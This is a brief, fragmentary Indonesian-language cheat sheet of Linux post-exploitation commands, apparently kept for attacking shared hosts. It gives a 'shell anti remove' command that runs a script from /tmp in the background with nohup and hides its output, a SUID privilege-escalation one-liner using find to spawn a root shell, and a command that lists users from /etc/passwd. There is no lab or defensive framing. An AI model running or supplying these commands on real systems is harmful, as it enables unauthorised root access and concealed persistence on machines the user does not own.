...
--------------------------
SHELL ANTI REMOVE
chmod +x /tmp/team/nohub.sh && nohup /tmp/team/nohub.sh >/dev/null 2>&1 &
...
Analisis Hasil: Jika kamu melihat find, vim, cp, atau nano dalam daftar tersebut, kamu bisa langsung jadi root.

Contoh (Exploit SUID Find):
find . -exec /bin/sh -p \; -quit

------------

Lihat daftar user: cat /etc/passwd | grep "/home"
